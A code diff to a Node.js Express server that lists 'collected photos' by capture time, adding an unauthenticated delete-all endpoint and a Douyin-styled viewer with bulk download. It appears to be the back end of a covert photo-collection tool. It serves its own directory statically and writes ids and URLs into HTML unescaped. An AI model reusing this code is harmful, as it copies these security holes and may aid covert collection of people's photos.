@@ -4,6 +4,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json({ limit: '20mb' }));
+app.use(express.static(__dirname));
 
 // 存储照片（内存，重启清空）
 const photoStore = {};
@@ -24,37 +25,120 @@ app.post('/api/upload', (req, res) => {
   res.json({ ok: true });
 });
 
+// 清除所有照片
+app.delete('/api/photos', (req, res) => {
+  Object.keys(photoStore).forEach(k => delete photoStore[k]);
+  res.json({ ok: true });
+});
+
 // 查看照片页面
 app.get('/photos', (req, res) => {
   const ids = Object.keys(photoStore);
-  if (ids.length === 0) {
-    return res.send('<h2 style="text-align:center;margin-top:40px;font-family:sans-serif;">暂无照片</h2>');
-  }
+  const isEmpty = ids.length === 0;
 
   let html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>已采集照片</title><style>
-body{font-family:sans-serif;background:#f5f5f5;margin:0;padding:16px}
-h1{font-size:18px;text-align:center;margin:16px 0}
-.session{background:#fff;border-radius:8px;padding:16px;margin-bottom:16px}
-.session-title{font-size:14px;color:#666;margin-bottom:10px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;color:#1a1a1a;padding:0 0 80px}
+.topbar{background:linear-gradient(135deg,#FE2C55,#D4163E);color:#fff;padding:16px;position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between}
+.topbar h1{font-size:17px;font-weight:700}
+.topbar-actions{display:flex;gap:8px}
+.topbar-btn{background:rgba(255,255,255,0.2);border:none;color:#fff;padding:6px 14px;border-radius:8px;font-size:13px;cursor:pointer;font-family:inherit}
+.topbar-btn:active{background:rgba(255,255,255,0.3)}
+.topbar-btn.danger{background:rgba(0,0,0,0.2)}
+.empty{text-align:center;padding:80px 20px;color:#999;font-size:15px}
+.session{background:#fff;margin:12px 16px;border-radius:12px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,0.04)}
+.session-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+.session-title{font-size:14px;color:#666}
+.session-check{width:18px;height:18px;accent-color:#FE2C55;cursor:pointer}
 .photos{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.photos img{width:100%;border-radius:4px;border:1px solid #eee}
-.meta{font-size:12px;color:#999;margin-top:8px}
-</style></head><body><h1>已采集照片</h1>`;
+.photo-wrap{position:relative;cursor:pointer}
+.photo-wrap img{width:100%;border-radius:8px;border:2px solid transparent;transition:border-color 0.15s;display:block}
+.photo-wrap.selected img{border-color:#FE2C55}
+.photo-wrap .check{position:absolute;top:6px;right:6px;width:22px;height:22px;background:#FE2C55;border-radius:50%;display:none;align-items:center;justify-content:center}
+.photo-wrap.selected .check{display:flex}
+.photo-wrap .check svg{width:14px;height:14px;fill:#fff}
+.meta{font-size:12px;color:#999;margin-top:10px}
+.bottom-bar{position:fixed;bottom:0;left:0;right:0;background:#fff;padding:12px 16px;box-shadow:0 -2px 10px rgba(0,0,0,0.06);display:none;align-items:center;justify-content:space-between;z-index:10}
+.bottom-bar.show{display:flex}
+.bottom-bar .count{font-size:14px;color:#333}
+.bottom-bar .dl-btn{background:linear-gradient(135deg,#FE2C55,#E81F4A);color:#fff;border:none;padding:10px 24px;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit}
+</style></head><body>
+<div class="topbar">
+  <h1>已采集照片</h1>
+  <div class="topbar-actions">
+    <button class="topbar-btn danger" onclick="clearAll()">清除全部</button>
+  </div>
+</div>`;
 
-  // 按时间倒序
-  ids.reverse().forEach(id => {
-    const photos = photoStore[id];
-    const time = id.split('_')[0];
-    const dateStr = new Date(parseInt(time)).toLocaleString('zh-CN');
-    html += `<div class="session"><div class="session-title">采集时间：${dateStr}</div><div class="photos">`;
-    photos.forEach((p, i) => {
-      if (p) html += `<img src="${p}" alt="照片${i + 1}">`;
+  if (isEmpty) {
+    html += '<div class="empty">暂无照片</div>';
+  } else {
+    ids.reverse().forEach(id => {
+      const photos = photoStore[id];
+      const time = id.split('_')[0];
+      const dateStr = new Date(parseInt(time)).toLocaleString('zh-CN');
+      const count = photos.filter(Boolean).length;
+      html += `<div class="session" data-id="${id}">
+  <div class="session-header">
+    <span class="session-title">${dateStr} · ${count} 张</span>
+    <input type="checkbox" class="session-check" onchange="toggleSession(this,'${id}')">
+  </div>
+  <div class="photos">`;
+      photos.forEach((p, i) => {
+        if (p) html += `<div class="photo-wrap" data-url="${p}" onclick="togglePhoto(this)">
+  <img src="${p}" alt="照片${i + 1}">
+  <div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
+</div>`;
+      });
+      html += `</div><div class="meta">Session: ${id}</div></div>`;
     });
-    html += `</div><div class="meta">共 ${photos.filter(Boolean).length} 张</div></div>`;
-  });
+  }
 
-  html += '</body></html>';
+  html += `<div class="bottom-bar" id="bottomBar">
+  <span class="count" id="selCount">已选 0 张</span>
+  <button class="dl-btn" onclick="downloadSelected()">下载选中</button>
+</div>
+<script>
+var selected = new Set();
+function updateBar(){
+  var bar=document.getElementById('bottomBar');
+  var c=selected.size;
+  document.getElementById('selCount').textContent='已选 '+c+' 张';
+  bar.className='bottom-bar'+(c>0?' show':'');
+}
+function togglePhoto(el){
+  var url=el.getAttribute('data-url');
+  if(selected.has(url)){selected.delete(url);el.classList.remove('selected')}
+  else{selected.add(url);el.classList.add('selected')}
+  updateBar();
+}
+function toggleSession(cb,sid){
+  var session=document.querySelector('.session[data-id="'+sid+'"]');
+  session.querySelectorAll('.photo-wrap').forEach(function(el){
+    var url=el.getAttribute('data-url');
+    if(cb.checked){selected.add(url);el.classList.add('selected')}
+    else{selected.delete(url);el.classList.remove('selected')}
+  });
+  updateBar();
+}
+function downloadSelected(){
+  if(selected.size===0)return;
+  var i=0;
+  selected.forEach(function(url){
+    var a=document.createElement('a');
+    a.href=url;
+    a.download='photo_'+(++i)+'.jpg';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  });
+}
+function clearAll(){
+  if(!confirm('确认清除所有照片？'))return;
+  fetch('/api/photos',{method:'DELETE'}).then(function(){location.reload()});
+}
+</script></body></html>`;
   res.send(html);
 });
 
